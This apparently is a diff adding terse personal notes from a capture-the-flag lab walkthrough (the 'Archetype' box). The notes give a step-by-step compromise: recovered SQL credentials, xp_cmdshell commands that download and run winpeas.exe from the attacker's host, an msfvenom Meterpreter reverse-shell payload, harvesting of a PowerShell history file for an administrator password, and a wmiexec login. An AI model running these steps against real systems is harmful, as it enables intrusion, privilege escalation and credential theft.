@@ -1,0 +1,46 @@
+We get SQL username and password
+-----------------------------------
+
+M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog
+
+ARCHETYPE\sql_svc;Initial change that into (/) ARCHETYPE/sql_svc;Initial.
+
+
+#mssqlclient.py -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
+
+
+Using xp_cmdshell to active windows command
+--------------------------------------------
+
+#xp_cmdshell "powershell -c pwd"
+
+
+#xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/winpeas.exe -OutFile C:\\Users\Public\\winpeas.exe"
+#xp_cmdshell "C:\\Users\Public\\winpeas.exe"
+
+cd command doesn't work but we can use that command to see directory
+---------------------------------------------------------------------
+SQL> xp_cmdshell "powershell -c cd C:\; dir"
+SQL> xp_cmdshell "powershell -c cd C:\Users; dir"
+
+If windows command doesn't work, we can use powershell -c $windows_cmd
+--------------------------------------------------------------------------
+
+To find windows payload
+-----------------------
+#msfvenom -l payloads | grep windows
+#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.227 LPORT=5555 -f exe -o payload.exe
+
+
+***** C:\Users\Public is like /tmp file in linux ****
+
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+
+/user:administrator MEGACORP_4dm1n!!
+
+
+#impacket-wmiexec ARCHETYPE/administrator:MEGACORP_4dm1n@10.129.224.17
+
+
+b91ccec3305e98240082d4474b848528
